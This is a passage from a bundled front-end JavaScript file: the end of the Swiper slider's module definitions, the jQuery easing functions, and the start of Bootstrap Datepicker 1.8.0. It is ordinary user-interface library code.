                    updateSize: B.updateSize.bind(this),
                    setTranslate: B.setTranslate.bind(this),
                    setTransition: B.setTransition.bind(this),
                    enableDraggable: B.enableDraggable.bind(this),
                    disableDraggable: B.disableDraggable.bind(this),
                    setDragPosition: B.setDragPosition.bind(this),
                    getPointerPosition: B.getPointerPosition.bind(this),
                    onDragStart: B.onDragStart.bind(this),
                    onDragMove: B.onDragMove.bind(this),
                    onDragEnd: B.onDragEnd.bind(this),
                    isTouched: !1,
                    timeout: null,
                    dragTimeout: null
                }
            })
        },
        on: {
            init: function() {
                this.scrollbar.init(),
                this.scrollbar.updateSize(),
                this.scrollbar.setTranslate()
            },
            update: function() {
                this.scrollbar.updateSize()
            },
            resize: function() {
                this.scrollbar.updateSize()
            },
            observerUpdate: function() {
                this.scrollbar.updateSize()
            },
            setTranslate: function() {
                this.scrollbar.setTranslate()
            },
            setTransition: function(e) {
                this.scrollbar.setTransition(e)
            },
            destroy: function() {
                this.scrollbar.destroy()
            }
        }
    }, {
        name: "parallax",
        params: {
            parallax: {
                enabled: !1
            }
        },
        create: function() {
            l.extend(this, {
                parallax: {
                    setTransform: X.setTransform.bind(this),
                    setTranslate: X.setTranslate.bind(this),
                    setTransition: X.setTransition.bind(this)
                }
            })
        },
        on: {
            beforeInit: function() {
                this.params.parallax.enabled && (this.params.watchSlidesProgress = !0,
                this.originalParams.watchSlidesProgress = !0)
            },
            init: function() {
                this.params.parallax.enabled && this.parallax.setTranslate()
            },
            setTranslate: function() {
                this.params.parallax.enabled && this.parallax.setTranslate()
            },
            setTransition: function(e) {
                this.params.parallax.enabled && this.parallax.setTransition(e)
            }
        }
    }, {
        name: "zoom",
        params: {
            zoom: {
                enabled: !1,
                maxRatio: 3,
                minRatio: 1,
                toggle: !0,
                containerClass: "swiper-zoom-container",
                zoomedSlideClass: "swiper-slide-zoomed"
            }
        },
        create: function() {
            var e = this
              , t = {
                enabled: !1,
                scale: 1,
                currentScale: 1,
                isScaling: !1,
                gesture: {
                    $slideEl: void 0,
                    slideWidth: void 0,
                    slideHeight: void 0,
                    $imageEl: void 0,
                    $imageWrapEl: void 0,
                    maxRatio: 3
                },
                image: {
                    isTouched: void 0,
                    isMoved: void 0,
                    currentX: void 0,
                    currentY: void 0,
                    minX: void 0,
                    minY: void 0,
                    maxX: void 0,
                    maxY: void 0,
                    width: void 0,
                    height: void 0,
                    startX: void 0,
                    startY: void 0,
                    touchesStart: {},
                    touchesCurrent: {}
                },
                velocity: {
                    x: void 0,
                    y: void 0,
                    prevPositionX: void 0,
                    prevPositionY: void 0,
                    prevTime: void 0
                }
            };
            "onGestureStart onGestureChange onGestureEnd onTouchStart onTouchMove onTouchEnd onTransitionEnd toggle enable disable in out".split(" ").forEach(function(i) {
                t[i] = V[i].bind(e)
            }),
            l.extend(e, {
                zoom: t
            });
            var i = 1;
            Object.defineProperty(e.zoom, "scale", {
                get: function() {
                    return i
                },
                set: function(t) {
                    if (i !== t) {
                        var s = e.zoom.gesture.$imageEl ? e.zoom.gesture.$imageEl[0] : void 0
                          , a = e.zoom.gesture.$slideEl ? e.zoom.gesture.$slideEl[0] : void 0;
                        e.emit("zoomChange", t, s, a)
                    }
                    i = t
                }
            })
        },
        on: {
            init: function() {
                this.params.zoom.enabled && this.zoom.enable()
            },
            destroy: function() {
                this.zoom.disable()
            },
            touchStart: function(e) {
                this.zoom.enabled && this.zoom.onTouchStart(e)
            },
            touchEnd: function(e) {
                this.zoom.enabled && this.zoom.onTouchEnd(e)
            },
            doubleTap: function(e) {
                this.params.zoom.enabled && this.zoom.enabled && this.params.zoom.toggle && this.zoom.toggle(e)
            },
            transitionEnd: function() {
                this.zoom.enabled && this.params.zoom.enabled && this.zoom.onTransitionEnd()
            }
        }
    }, {
        name: "lazy",
        params: {
            lazy: {
                enabled: !1,
                loadPrevNext: !1,
                loadPrevNextAmount: 1,
                loadOnTransitionStart: !1,
                elementClass: "swiper-lazy",
                loadingClass: "swiper-lazy-loading",
                loadedClass: "swiper-lazy-loaded",
                preloaderClass: "swiper-lazy-preloader"
            }
        },
        create: function() {
            l.extend(this, {
                lazy: {
                    initialImageLoaded: !1,
                    load: Y.load.bind(this),
                    loadInSlide: Y.loadInSlide.bind(this)
                }
            })
        },
        on: {
            beforeInit: function() {
                this.params.lazy.enabled && this.params.preloadImages && (this.params.preloadImages = !1)
            },
            init: function() {
                this.params.lazy.enabled && !this.params.loop && 0 === this.params.initialSlide && this.lazy.load()
            },
            scroll: function() {
                this.params.freeMode && !this.params.freeModeSticky && this.lazy.load()
            },
            resize: function() {
                this.params.lazy.enabled && this.lazy.load()
            },
            scrollbarDragMove: function() {
                this.params.lazy.enabled && this.lazy.load()
            },
            transitionStart: function() {
                this.params.lazy.enabled && (this.params.lazy.loadOnTransitionStart || !this.params.lazy.loadOnTransitionStart && !this.lazy.initialImageLoaded) && this.lazy.load()
            },
            transitionEnd: function() {
                this.params.lazy.enabled && !this.params.lazy.loadOnTransitionStart && this.lazy.load()
            }
        }
    }, {
        name: "controller",
        params: {
            controller: {
                control: void 0,
                inverse: !1,
                by: "slide"
            }
        },
        create: function() {
            l.extend(this, {
                controller: {
                    control: this.params.controller.control,
                    getInterpolateFunction: F.getInterpolateFunction.bind(this),
                    setTranslate: F.setTranslate.bind(this),
                    setTransition: F.setTransition.bind(this)
                }
            })
        },
        on: {
            update: function() {
                this.controller.control && this.controller.spline && (this.controller.spline = void 0,
                delete this.controller.spline)
            },
            resize: function() {
                this.controller.control && this.controller.spline && (this.controller.spline = void 0,
                delete this.controller.spline)
            },
            observerUpdate: function() {
                this.controller.control && this.controller.spline && (this.controller.spline = void 0,
                delete this.controller.spline)
            },
            setTranslate: function(e, t) {
                this.controller.control && this.controller.setTranslate(e, t)
            },
            setTransition: function(e, t) {
                this.controller.control && this.controller.setTransition(e, t)
            }
        }
    }, {
        name: "a11y",
        params: {
            a11y: {
                enabled: !0,
                notificationClass: "swiper-notification",
                prevSlideMessage: "Previous slide",
                nextSlideMessage: "Next slide",
                firstSlideMessage: "This is the first slide",
                lastSlideMessage: "This is the last slide",
                paginationBulletMessage: "Go to slide {{index}}"
            }
        },
        create: function() {
            var e = this;
            l.extend(e, {
                a11y: {
                    liveRegion: s('<span class="' + e.params.a11y.notificationClass + '" aria-live="assertive" aria-atomic="true"></span>')
                }
            }),
            Object.keys(R).forEach(function(t) {
                e.a11y[t] = R[t].bind(e)
            })
        },
        on: {
            init: function() {
                this.params.a11y.enabled && (this.a11y.init(),
                this.a11y.updateNavigation())
            },
            toEdge: function() {
                this.params.a11y.enabled && this.a11y.updateNavigation()
            },
            fromEdge: function() {
                this.params.a11y.enabled && this.a11y.updateNavigation()
            },
            paginationUpdate: function() {
                this.params.a11y.enabled && this.a11y.updatePagination()
            },
            destroy: function() {
                this.params.a11y.enabled && this.a11y.destroy()
            }
        }
    }, {
        name: "history",
        params: {
            history: {
                enabled: !1,
                replaceState: !1,
                key: "slides"
            }
        },
        create: function() {
            l.extend(this, {
                history: {
                    init: q.init.bind(this),
                    setHistory: q.setHistory.bind(this),
                    setHistoryPopState: q.setHistoryPopState.bind(this),
                    scrollToSlide: q.scrollToSlide.bind(this),
                    destroy: q.destroy.bind(this)
                }
            })
        },
        on: {
            init: function() {
                this.params.history.enabled && this.history.init()
            },
            destroy: function() {
                this.params.history.enabled && this.history.destroy()
            },
            transitionEnd: function() {
                this.history.initialized && this.history.setHistory(this.params.history.key, this.activeIndex)
            }
        }
    }, {
        name: "hash-navigation",
        params: {
            hashNavigation: {
                enabled: !1,
                replaceState: !1,
                watchState: !1
            }
        },
        create: function() {
            l.extend(this, {
                hashNavigation: {
                    initialized: !1,
                    init: W.init.bind(this),
                    destroy: W.destroy.bind(this),
                    setHash: W.setHash.bind(this),
                    onHashCange: W.onHashCange.bind(this)
                }
            })
        },
        on: {
            init: function() {
                this.params.hashNavigation.enabled && this.hashNavigation.init()
            },
            destroy: function() {
                this.params.hashNavigation.enabled && this.hashNavigation.destroy()
            },
            transitionEnd: function() {
                this.hashNavigation.initialized && this.hashNavigation.setHash()
            }
        }
    }, {
        name: "autoplay",
        params: {
            autoplay: {
                enabled: !1,
                delay: 3e3,
                waitForTransition: !0,
                disableOnInteraction: !0,
                stopOnLastSlide: !1,
                reverseDirection: !1
            }
        },
        create: function() {
            var e = this;
            l.extend(e, {
                autoplay: {
                    running: !1,
                    paused: !1,
                    run: j.run.bind(e),
                    start: j.start.bind(e),
                    stop: j.stop.bind(e),
                    pause: j.pause.bind(e),
                    onTransitionEnd: function(t) {
                        e && !e.destroyed && e.$wrapperEl && t.target === this && (e.$wrapperEl[0].removeEventListener("transitionend", e.autoplay.onTransitionEnd),
                        e.$wrapperEl[0].removeEventListener("webkitTransitionEnd", e.autoplay.onTransitionEnd),
                        e.autoplay.paused = !1,
                        e.autoplay.running ? e.autoplay.run() : e.autoplay.stop())
                    }
                }
            })
        },
        on: {
            init: function() {
                this.params.autoplay.enabled && this.autoplay.start()
            },
            beforeTransitionStart: function(e, t) {
                this.autoplay.running && (t || !this.params.autoplay.disableOnInteraction ? this.autoplay.pause(e) : this.autoplay.stop())
            },
            sliderFirstMove: function() {
                this.autoplay.running && (this.params.autoplay.disableOnInteraction ? this.autoplay.stop() : this.autoplay.pause())
            },
            destroy: function() {
                this.autoplay.running && this.autoplay.stop()
            }
        }
    }, {
        name: "effect-fade",
        params: {
            fadeEffect: {
                crossFade: !1
            }
        },
        create: function() {
            l.extend(this, {
                fadeEffect: {
                    setTranslate: U.setTranslate.bind(this),
                    setTransition: U.setTransition.bind(this)
                }
            })
        },
        on: {
            beforeInit: function() {
                if ("fade" === this.params.effect) {
                    this.classNames.push(this.params.containerModifierClass + "fade");
                    var e = {
                        slidesPerView: 1,
                        slidesPerColumn: 1,
                        slidesPerGroup: 1,
                        watchSlidesProgress: !0,
                        spaceBetween: 0,
                        virtualTranslate: !0
                    };
                    l.extend(this.params, e),
                    l.extend(this.originalParams, e)
                }
            },
            setTranslate: function() {
                "fade" === this.params.effect && this.fadeEffect.setTranslate()
            },
            setTransition: function(e) {
                "fade" === this.params.effect && this.fadeEffect.setTransition(e)
            }
        }
    }, {
        name: "effect-cube",
        params: {
            cubeEffect: {
                slideShadows: !0,
                shadow: !0,
                shadowOffset: 20,
                shadowScale: .94
            }
        },
        create: function() {
            l.extend(this, {
                cubeEffect: {
                    setTranslate: K.setTranslate.bind(this),
                    setTransition: K.setTransition.bind(this)
                }
            })
        },
        on: {
            beforeInit: function() {
                if ("cube" === this.params.effect) {
                    this.classNames.push(this.params.containerModifierClass + "cube"),
                    this.classNames.push(this.params.containerModifierClass + "3d");
                    var e = {
                        slidesPerView: 1,
                        slidesPerColumn: 1,
                        slidesPerGroup: 1,
                        watchSlidesProgress: !0,
                        resistanceRatio: 0,
                        spaceBetween: 0,
                        centeredSlides: !1,
                        virtualTranslate: !0
                    };
                    l.extend(this.params, e),
                    l.extend(this.originalParams, e)
                }
            },
            setTranslate: function() {
                "cube" === this.params.effect && this.cubeEffect.setTranslate()
            },
            setTransition: function(e) {
                "cube" === this.params.effect && this.cubeEffect.setTransition(e)
            }
        }
    }, {
        name: "effect-flip",
        params: {
            flipEffect: {
                slideShadows: !0,
                limitRotation: !0
            }
        },
        create: function() {
            l.extend(this, {
                flipEffect: {
                    setTranslate: _.setTranslate.bind(this),
                    setTransition: _.setTransition.bind(this)
                }
            })
        },
        on: {
            beforeInit: function() {
                if ("flip" === this.params.effect) {
                    this.classNames.push(this.params.containerModifierClass + "flip"),
                    this.classNames.push(this.params.containerModifierClass + "3d");
                    var e = {
                        slidesPerView: 1,
                        slidesPerColumn: 1,
                        slidesPerGroup: 1,
                        watchSlidesProgress: !0,
                        spaceBetween: 0,
                        virtualTranslate: !0
                    };
                    l.extend(this.params, e),
                    l.extend(this.originalParams, e)
                }
            },
            setTranslate: function() {
                "flip" === this.params.effect && this.flipEffect.setTranslate()
            },
            setTransition: function(e) {
                "flip" === this.params.effect && this.flipEffect.setTransition(e)
            }
        }
    }, {
        name: "effect-coverflow",
        params: {
            coverflowEffect: {
                rotate: 50,
                stretch: 0,
                depth: 100,
                modifier: 1,
                slideShadows: !0
            }
        },
        create: function() {
            l.extend(this, {
                coverflowEffect: {
                    setTranslate: Z.setTranslate.bind(this),
                    setTransition: Z.setTransition.bind(this)
                }
            })
        },
        on: {
            beforeInit: function() {
                "coverflow" === this.params.effect && (this.classNames.push(this.params.containerModifierClass + "coverflow"),
                this.classNames.push(this.params.containerModifierClass + "3d"),
                this.params.watchSlidesProgress = !0,
                this.originalParams.watchSlidesProgress = !0)
            },
            setTranslate: function() {
                "coverflow" === this.params.effect && this.coverflowEffect.setTranslate()
            },
            setTransition: function(e) {
                "coverflow" === this.params.effect && this.coverflowEffect.setTransition(e)
            }
        }
    }, {
        name: "thumbs",
        params: {
            thumbs: {
                swiper: null,
                slideThumbActiveClass: "swiper-slide-thumb-active",
                thumbsContainerClass: "swiper-container-thumbs"
            }
        },
        create: function() {
            l.extend(this, {
                thumbs: {
                    swiper: null,
                    init: Q.init.bind(this),
                    update: Q.update.bind(this),
                    onThumbClick: Q.onThumbClick.bind(this)
                }
            })
        },
        on: {
            beforeInit: function() {
                var e = this.params.thumbs;
                e && e.swiper && (this.thumbs.init(),
                this.thumbs.update(!0))
            },
            slideChange: function() {
                this.thumbs.swiper && this.thumbs.update()
            },
            update: function() {
                this.thumbs.swiper && this.thumbs.update()
            },
            resize: function() {
                this.thumbs.swiper && this.thumbs.update()
            },
            observerUpdate: function() {
                this.thumbs.swiper && this.thumbs.update()
            },
            setTransition: function(e) {
                var t = this.thumbs.swiper;
                t && t.setTransition(e)
            },
            beforeDestroy: function() {
                var e = this.thumbs.swiper;
                e && this.thumbs.swiperCreated && e && e.destroy()
            }
        }
    }];
    return void 0 === C.use && (C.use = C.Class.use,
    C.installModule = C.Class.installModule),
    C.use(J),
    C
});
jQuery.easing.jswing = jQuery.easing.swing;
jQuery.extend(jQuery.easing, {
    def: "easeOutQuad",
    swing: function(e, f, a, h, g) {
        return jQuery.easing[jQuery.easing.def](e, f, a, h, g)
    },
    easeInQuad: function(e, f, a, h, g) {
        return h * (f /= g) * f + a
    },
    easeOutQuad: function(e, f, a, h, g) {
        return -h * (f /= g) * (f - 2) + a
    },
    easeInOutQuad: function(e, f, a, h, g) {
        if ((f /= g / 2) < 1) {
            return h / 2 * f * f + a
        }
        return -h / 2 * ((--f) * (f - 2) - 1) + a
    },
    easeInCubic: function(e, f, a, h, g) {
        return h * (f /= g) * f * f + a
    },
    easeOutCubic: function(e, f, a, h, g) {
        return h * ((f = f / g - 1) * f * f + 1) + a
    },
    easeInOutCubic: function(e, f, a, h, g) {
        if ((f /= g / 2) < 1) {
            return h / 2 * f * f * f + a
        }
        return h / 2 * ((f -= 2) * f * f + 2) + a
    },
    easeInQuart: function(e, f, a, h, g) {
        return h * (f /= g) * f * f * f + a
    },
    easeOutQuart: function(e, f, a, h, g) {
        return -h * ((f = f / g - 1) * f * f * f - 1) + a
    },
    easeInOutQuart: function(e, f, a, h, g) {
        if ((f /= g / 2) < 1) {
            return h / 2 * f * f * f * f + a
        }
        return -h / 2 * ((f -= 2) * f * f * f - 2) + a
    },
    easeInQuint: function(e, f, a, h, g) {
        return h * (f /= g) * f * f * f * f + a
    },
    easeOutQuint: function(e, f, a, h, g) {
        return h * ((f = f / g - 1) * f * f * f * f + 1) + a
    },
    easeInOutQuint: function(e, f, a, h, g) {
        if ((f /= g / 2) < 1) {
            return h / 2 * f * f * f * f * f + a
        }
        return h / 2 * ((f -= 2) * f * f * f * f + 2) + a
    },
    easeInSine: function(e, f, a, h, g) {
        return -h * Math.cos(f / g * (Math.PI / 2)) + h + a
    },
    easeOutSine: function(e, f, a, h, g) {
        return h * Math.sin(f / g * (Math.PI / 2)) + a
    },
    easeInOutSine: function(e, f, a, h, g) {
        return -h / 2 * (Math.cos(Math.PI * f / g) - 1) + a
    },
    easeInExpo: function(e, f, a, h, g) {
        return (f == 0) ? a : h * Math.pow(2, 10 * (f / g - 1)) + a
    },
    easeOutExpo: function(e, f, a, h, g) {
        return (f == g) ? a + h : h * (-Math.pow(2, -10 * f / g) + 1) + a
    },
    easeInOutExpo: function(e, f, a, h, g) {
        if (f == 0) {
            return a
        }
        if (f == g) {
            return a + h
        }
        if ((f /= g / 2) < 1) {
            return h / 2 * Math.pow(2, 10 * (f - 1)) + a
        }
        return h / 2 * (-Math.pow(2, -10 * --f) + 2) + a
    },
    easeInCirc: function(e, f, a, h, g) {
        return -h * (Math.sqrt(1 - (f /= g) * f) - 1) + a
    },
    easeOutCirc: function(e, f, a, h, g) {
        return h * Math.sqrt(1 - (f = f / g - 1) * f) + a
    },
    easeInOutCirc: function(e, f, a, h, g) {
        if ((f /= g / 2) < 1) {
            return -h / 2 * (Math.sqrt(1 - f * f) - 1) + a
        }
        return h / 2 * (Math.sqrt(1 - (f -= 2) * f) + 1) + a
    },
    easeInElastic: function(f, h, e, l, k) {
        var i = 1.70158;
        var j = 0;
        var g = l;
        if (h == 0) {
            return e
        }
        if ((h /= k) == 1) {
            return e + l
        }
        if (!j) {
            j = k * 0.3
        }
        if (g < Math.abs(l)) {
            g = l;
            var i = j / 4
        } else {
            var i = j / (2 * Math.PI) * Math.asin(l / g)
        }
        return -(g * Math.pow(2, 10 * (h -= 1)) * Math.sin((h * k - i) * (2 * Math.PI) / j)) + e
    },
    easeOutElastic: function(f, h, e, l, k) {
        var i = 1.70158;
        var j = 0;
        var g = l;
        if (h == 0) {
            return e
        }
        if ((h /= k) == 1) {
            return e + l
        }
        if (!j) {
            j = k * 0.3
        }
        if (g < Math.abs(l)) {
            g = l;
            var i = j / 4
        } else {
            var i = j / (2 * Math.PI) * Math.asin(l / g)
        }
        return g * Math.pow(2, -10 * h) * Math.sin((h * k - i) * (2 * Math.PI) / j) + l + e
    },
    easeInOutElastic: function(f, h, e, l, k) {
        var i = 1.70158;
        var j = 0;
        var g = l;
        if (h == 0) {
            return e
        }
        if ((h /= k / 2) == 2) {
            return e + l
        }
        if (!j) {
            j = k * (0.3 * 1.5)
        }
        if (g < Math.abs(l)) {
            g = l;
            var i = j / 4
        } else {
            var i = j / (2 * Math.PI) * Math.asin(l / g)
        }
        if (h < 1) {
            return -0.5 * (g * Math.pow(2, 10 * (h -= 1)) * Math.sin((h * k - i) * (2 * Math.PI) / j)) + e
        }
        return g * Math.pow(2, -10 * (h -= 1)) * Math.sin((h * k - i) * (2 * Math.PI) / j) * 0.5 + l + e
    },
    easeInBack: function(e, f, a, i, h, g) {
        if (g == undefined) {
            g = 1.70158
        }
        return i * (f /= h) * f * ((g + 1) * f - g) + a
    },
    easeOutBack: function(e, f, a, i, h, g) {
        if (g == undefined) {
            g = 1.70158
        }
        return i * ((f = f / h - 1) * f * ((g + 1) * f + g) + 1) + a
    },
    easeInOutBack: function(e, f, a, i, h, g) {
        if (g == undefined) {
            g = 1.70158
        }
        if ((f /= h / 2) < 1) {
            return i / 2 * (f * f * (((g *= (1.525)) + 1) * f - g)) + a
        }
        return i / 2 * ((f -= 2) * f * (((g *= (1.525)) + 1) * f + g) + 2) + a
    },
    easeInBounce: function(e, f, a, h, g) {
        return h - jQuery.easing.easeOutBounce(e, g - f, 0, h, g) + a
    },
    easeOutBounce: function(e, f, a, h, g) {
        if ((f /= g) < (1 / 2.75)) {
            return h * (7.5625 * f * f) + a
        } else {
            if (f < (2 / 2.75)) {
                return h * (7.5625 * (f -= (1.5 / 2.75)) * f + 0.75) + a
            } else {
                if (f < (2.5 / 2.75)) {
                    return h * (7.5625 * (f -= (2.25 / 2.75)) * f + 0.9375) + a
                } else {
                    return h * (7.5625 * (f -= (2.625 / 2.75)) * f + 0.984375) + a
                }
            }
        }
    },
    easeInOutBounce: function(e, f, a, h, g) {
        if (f < g / 2) {
            return jQuery.easing.easeInBounce(e, f * 2, 0, h, g) * 0.5 + a
        }
        return jQuery.easing.easeOutBounce(e, f * 2 - g, 0, h, g) * 0.5 + h * 0.5 + a
    }
});
/*!
* Datepicker for Bootstrap v1.8.0 (https://github.com/uxsolutions/bootstrap-datepicker)
*
* Licensed under the Apache License v2.0 (http://www.apache.org/licenses/LICENSE-2.0)
*/
!function(a) {
    "function" == typeof define && define.amd ? define(["jquery"], a) : a("object" == typeof exports ? require("jquery") : jQuery)
}(function(a, b) {
    function c() {
        return new Date(Date.UTC.apply(Date, arguments))
    }
    function d() {
        var a = new Date;
        return c(a.getFullYear(), a.getMonth(), a.getDate())
    }
    function e(a, b) {
        return a.getUTCFullYear() === b.getUTCFullYear() && a.getUTCMonth() === b.getUTCMonth() && a.getUTCDate() === b.getUTCDate()
    }
    function f(c, d) {
        return function() {
            return d !== b && a.fn.datepicker.deprecated(d),
            this[c].apply(this, arguments)
        }
    }
    function g(a) {
        return a && !isNaN(a.getTime())
    }
    function h(b, c) {
        function d(a, b) {
            return b.toLowerCase()
        }
        var e, f = a(b).data(), g = {}, h = new RegExp("^" + c.toLowerCase() + "([A-Z])");
        c = new RegExp("^" + c.toLowerCase());
        for (var i in f)
            c.test(i) && (e = i.replace(h, d),
            g[e] = f[i]);
        return g
    }
    function i(b) {
        var c = {};
        if (q[b] || (b = b.split("-")[0],
        q[b])) {
            var d = q[b];
            return a.each(p, function(a, b) {
                b in d && (c[b] = d[b])
            }),
            c
        }
    }
    var j = function() {
        var b = {
            get: function(a) {
                return this.slice(a)[0]
            },
            contains: function(a) {
                for (var b = a && a.valueOf(), c = 0, d = this.length; c < d; c++)
                    if (0 <= this[c].valueOf() - b && this[c].valueOf() - b < 864e5)
                        return c;
                return -1
            },
            remove: function(a) {
                this.splice(a, 1)
            },
            replace: function(b) {
                b && (a.isArray(b) || (b = [b]),
                this.clear(),
                this.push.apply(this, b))
            },
            clear: function() {
                this.length = 0
            },
            copy: function() {
                var a = new j;
                return a.replace(this),
                a
            }
        };
        return function() {
            var c = [];
            return c.push.apply(c, arguments),
            a.extend(c, b),
            c
        }
    }()
      , k = function(b, c) {
        a.data(b, "datepicker", this),
        this._process_options(c),
        this.dates = new j,
        this.viewDate = this.o.defaultViewDate,
        this.focusDate = null,
        this.element = a(b),
        this.isInput = this.element.is("input"),
        this.inputField = this.isInput ? this.element : this.element.find("input"),
        this.component = !!this.element.hasClass("date") && this.element.find(".add-on, .input-group-addon, .btn"),
        this.component && 0 === this.component.length && (this.component = !1),
        this.isInline = !this.component && this.element.is("div"),
        this.picker = a(r.template),
        this._check_template(this.o.templates.leftArrow) && this.picker.find(".prev").html(this.o.templates.leftArrow),
        this._check_template(this.o.templates.rightArrow) && this.picker.find(".next").html(this.o.templates.rightArrow),
        this._buildEvents(),
        this._attachEvents(),
        this.isInline ? this.picker.addClass("datepicker-inline").appendTo(this.element) : this.picker.addClass("datepicker-dropdown dropdown-menu"),
        this.o.rtl && this.picker.addClass("datepicker-rtl"),
        this.o.calendarWeeks && this.picker.find(".datepicker-days .datepicker-switch, thead .datepicker-title, tfoot .today, tfoot .clear").attr("colspan", function(a, b) {
            return Number(b) + 1
        }),
        this._process_options({
            startDate: this._o.startDate,
            endDate: this._o.endDate,
            daysOfWeekDisabled: this.o.daysOfWeekDisabled,
            daysOfWeekHighlighted: this.o.daysOfWeekHighlighted,
            datesDisabled: this.o.datesDisabled
        }),
        this._allow_update = !1,
        this.setViewMode(this.o.startView),
        this._allow_update = !0,
        this.fillDow(),
        this.fillMonths(),
        this.update(),
        this.isInline && this.show()
    };
    k.prototype = {
        constructor: k,
        _resolveViewName: function(b) {
            return a.each(r.viewModes, function(c, d) {
                if (b === c || a.inArray(b, d.names) !== -1)
                    return b = c,
                    !1
            }),
            b
        },
        _resolveDaysOfWeek: function(b) {
            return a.isArray(b) || (b = b.split(/[,\s]*/)),
            a.map(b, Number)
        },
        _check_template: function(c) {
            try {
                if (c === b || "" === c)
                    return !1;
                if ((c.match(/[<>]/g) || []).length <= 0)
                    return !0;
                var d = a(c);
                return d.length > 0
            } catch (a) {
                return !1
            }
        },
        _process_options: function(b) {
            this._o = a.extend({}, this._o, b);
            var e = this.o = a.extend({}, this._o)
              , f = e.language;
            q[f] || (f = f.split("-")[0],
            q[f] || (f = o.language)),
            e.language = f,
            e.startView = this._resolveViewName(e.startView),
            e.minViewMode = this._resolveViewName(e.minViewMode),
            e.maxViewMode = this._resolveViewName(e.maxViewMode),
            e.startView = Math.max(this.o.minViewMode, Math.min(this.o.maxViewMode, e.startView)),
            e.multidate !== !0 && (e.multidate = Number(e.multidate) || !1,
            e.multidate !== !1 && (e.multidate = Math.max(0, e.multidate))),
            e.multidateSeparator = String(e.multidateSeparator),
            e.weekStart %= 7,
            e.weekEnd = (e.weekStart + 6) % 7;
            var g = r.parseFormat(e.format);
            e.startDate !== -(1 / 0) && (e.startDate ? e.startDate instanceof Date ? e.startDate = this._local_to_utc(this._zero_time(e.startDate)) : e.startDate = r.parseDate(e.startDate, g, e.language, e.assumeNearbyYear) : e.startDate = -(1 / 0)),
            e.endDate !== 1 / 0 && (e.endDate ? e.endDate instanceof Date ? e.endDate = this._local_to_utc(this._zero_time(e.endDate)) : e.endDate = r.parseDate(e.endDate, g, e.language, e.assumeNearbyYear) : e.endDate = 1 / 0),
            e.daysOfWeekDisabled = this._resolveDaysOfWeek(e.daysOfWeekDisabled || []),
            e.daysOfWeekHighlighted = this._resolveDaysOfWeek(e.daysOfWeekHighlighted || []),
            e.datesDisabled = e.datesDisabled || [],
            a.isArray(e.datesDisabled) || (e.datesDisabled = e.datesDisabled.split(",")),
            e.datesDisabled = a.map(e.datesDisabled, function(a) {
                return r.parseDate(a, g, e.language, e.assumeNearbyYear)
            });
            var h = String(e.orientation).toLowerCase().split(/\s+/g)
              , i = e.orientation.toLowerCase();
            if (h = a.grep(h, function(a) {
                return /^auto|left|right|top|bottom$/.test(a)
            }),
            e.orientation = {
                x: "auto",
                y: "auto"
            },
            i && "auto" !== i)
                if (1 === h.length)
                    switch (h[0]) {
                    case "top":
                    case "bottom":
                        e.orientation.y = h[0];
                        break;
                    case "left":
                    case "right":
                        e.orientation.x = h[0]
                    }
                else
                    i = a.grep(h, function(a) {
                        return /^left|right$/.test(a)
                    }),
                    e.orientation.x = i[0] || "auto",
                    i = a.grep(h, function(a) {
                        return /^top|bottom$/.test(a)
                    }),
                    e.orientation.y = i[0] || "auto";
            else
                ;if (e.defaultViewDate instanceof Date || "string" == typeof e.defaultViewDate)
                e.defaultViewDate = r.parseDate(e.defaultViewDate, g, e.language, e.assumeNearbyYear);
            else if (e.defaultViewDate) {
                var j = e.defaultViewDate.year || (new Date).getFullYear()
                  , k = e.defaultViewDate.month || 0
                  , l = e.defaultViewDate.day || 1;
                e.defaultViewDate = c(j, k, l)
            } else
                e.defaultViewDate = d()
        },
        _events: [],
        _secondaryEvents: [],
        _applyEvents: function(a) {
            for (var c, d, e, f = 0; f < a.length; f++)
                c = a[f][0],
                2 === a[f].length ? (d = b,
                e = a[f][1]) : 3 === a[f].length && (d = a[f][1],
                e = a[f][2]),
                c.on(e, d)
        },
        _unapplyEvents: function(a) {
            for (var c, d, e, f = 0; f < a.length; f++)
                c = a[f][0],
                2 === a[f].length ? (e = b,
                d = a[f][1]) : 3 === a[f].length && (e = a[f][1],
                d = a[f][2]),
                c.off(d, e)
        },
        _buildEvents: function() {
            var b = {
                keyup: a.proxy(function(b) {
                    a.inArray(b.keyCode, [27, 37, 39, 38, 40, 32, 13, 9]) === -1 && this.update()
                }, this),
                keydown: a.proxy(this.keydown, this),
                paste: a.proxy(this.paste, this)
            };
            this.o.showOnFocus === !0 && (b.focus = a.proxy(this.show, this)),
            this.isInput ? this._events = [[this.element, b]] : this.component && this.inputField.length ? this._events = [[this.inputField, b], [this.component, {
                click: a.proxy(this.show, this)
            }]] : this._events = [[this.element, {
                click: a.proxy(this.show, this),
                keydown: a.proxy(this.keydown, this)
            }]],
            this._events.push([this.element, "*", {
                blur: a.proxy(function(a) {
                    this._focused_from = a.target
                }, this)
            }], [this.element, {
                blur: a.proxy(function(a) {
                    this._focused_from = a.target
                }, this)
            }]),
            this.o.immediateUpdates && this._events.push([this.element, {
                "changeYear changeMonth": a.proxy(function(a) {
                    this.update(a.date)
                }, this)
            }]),
            this._secondaryEvents = [[this.picker, {
                click: a.proxy(this.click, this)
            }], [this.picker, ".prev, .next", {
                click: a.proxy(this.navArrowsClick, this)
            }], [this.picker, ".day:not(.disabled)", {
                click: a.proxy(this.dayCellClick, this)
            }], [a(window), {
                resize: a.proxy(this.place, this)
            }], [a(document), {
                "mousedown touchstart": a.proxy(function(a) {
                    this.element.is(a.target) || this.element.find(a.target).length || this.picker.is(a.target) || this.picker.find(a.target).length || this.isInline || this.hide()
                }, this)
            }]]
        },
        _attachEvents: function() {
            this._detachEvents(),
            this._applyEvents(this._events)
        },
        _detachEvents: function() {
            this._unapplyEvents(this._events)
        },
        _attachSecondaryEvents: function() {
            this._detachSecondaryEvents(),
            this._applyEvents(this._secondaryEvents)
        },
        _detachSecondaryEvents: function() {
            this._unapplyEvents(this._secondaryEvents)
        },
        _trigger: function(b, c) {
            var d = c || this.dates.get(-1)
              , e = this._utc_to_local(d);
            this.element.trigger({
                type: b,
                date: e,
                viewMode: this.viewMode,
                dates: a.map(this.dates, this._utc_to_local),
                format: a.proxy(function(a, b) {
                    0 === arguments.length ? (a = this.dates.length - 1,
                    b = this.o.format) : "string" == typeof a && (b = a,
                    a = this.dates.length - 1),
                    b = b || this.o.format;
                    var c = this.dates.get(a);
                    return r.formatDate(c, b, this.o.language)
                }, this)
            })
        },
        show: function() {
            if (!(this.inputField.prop("disabled") || this.inputField.prop("readonly") && this.o.enableOnReadonly === !1))
                return this.isInline || this.picker.appendTo(this.o.container),
